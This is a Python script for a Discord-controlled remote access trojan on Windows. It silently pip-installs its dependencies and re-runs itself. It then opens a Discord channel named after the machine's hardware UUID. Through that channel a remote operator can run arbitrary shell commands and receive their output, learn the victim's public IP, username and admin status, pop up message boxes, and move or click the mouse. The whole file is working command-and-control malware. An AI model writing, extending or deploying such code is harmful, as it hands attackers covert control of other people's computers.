import os
import subprocess
import sys  
import time
import ctypes
import threading
import base64
try:
    import keyboard
    import wmi
    import mouse
    import requests
    import getpass
    import pyautogui
except:
    os.system('pip install wmi&pip install mouse&pip install requests&pip install keyboard&pip install pyautogui')
    os.system('python "' + __file__ + '"')
    exit()
import DiscordRestAPI
import atexit
def get_user_uuid():
    wmi_obj = wmi.WMI()
    computer_system = wmi_obj.Win32_ComputerSystemProduct()[0]
    computer_uuid = computer_system.UUID
    return computer_uuid.lower()
guild_id = '1214641970631417876'
user = DiscordRestAPI.User()
user = user.Login('g',True)
channel_id = user.Channel.Create(user,guild_id,get_user_uuid(),"1214644732148588555")['id']
def Mbox(text):
    with open(os.environ['temp'] + '\\message.vbs','w') as f:
        f.write(f'''MsgBox "{text.replace('"', '""').replace(chr(10),' ')}"''')
    os.system('start ' + os.environ['temp'] + '\\message.vbs')
    time.sleep(1)
    os.system('del /f ' +os.environ['temp'] + '\\message.vbs')
def remove_channel(id):
    user.Channel.Delete(user,id)
def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1
def get_info(thing=''):
    if thing=='ip':
        msg = 'IP: ' + requests.get('https://api.ipify.org?format=text').text
    elif thing=='user':
        msg = 'User👤: ' + getpass.getuser() + ' Admin:' + ['❌','✅'][IsAdmin()]
    else:
        msg = 'Pick a option (ip/user)'
    user.Message.Send(user,msg,channel_id)
def exit_script():
    global stop
    stop = True
    user.StopThreads()
    sys.exit()
def run_command(*cmd):
    user.Message.Send(user,'Running command!',channel_id)
    output = subprocess.run(' '.join(list(cmd)),shell=True,capture_output=True,text=True).stdout
    user.Message.Send(user,output,channel_id)
def msgbox(*text):
    threading.Thread(target=Mbox,args=(' '.join(list(text)),)).start()
    user.Message.Send(user,'Sent message ' + ' '.join(list(text)) + ' Successfully!',channel_id)
def move_mouse(x=None,y=None):
    if not x or not y:
        user.Message.Send(user,'Input a x,y for the mouse to go to',channel_id)
        return
    try:
        pyautogui.moveTo(int(x),int(y))
    except:
        user.Message.Send(user,'Input valid x,y',channel_id)
    else:
        user.Message.Send(user,'Moved mouse!',channel_id)
def click(clicktype='left'):
    if clicktype!='left' and clicktype!='right':
        user.Message.Send(user,'left/right click',channel_id)
        return
    if clicktype=='left':
        pyautogui.leftClick()
    else:
        pyautogui.rightClick()
    user.Message.Send(user,'Clicked mouse!',channel_id)

def help_cmd():
    ...
stop = False
user.Command.add_command(user,'get_info',channel_id,'!',get_info,1)
user.Command.add_command(user,'stop',channel_id,'!',exit_script)
user.Command.add_command(user,'run_cmd',channel_id,'!',run_command,-1)
user.Command.add_command(user,'msg',channel_id,'!',msgbox,-1)
#user.Command.add_command(user,'click',channel_id,'!',click,1)
user.Command.add_command(user,'move',channel_id,'!',move_mouse,2)

atexit.register(remove_channel,channel_id)
#time.sleep(3)
#user.Message.Send(user,'?stop',channel_id)
while not stop:
    time.sleep(0.1)
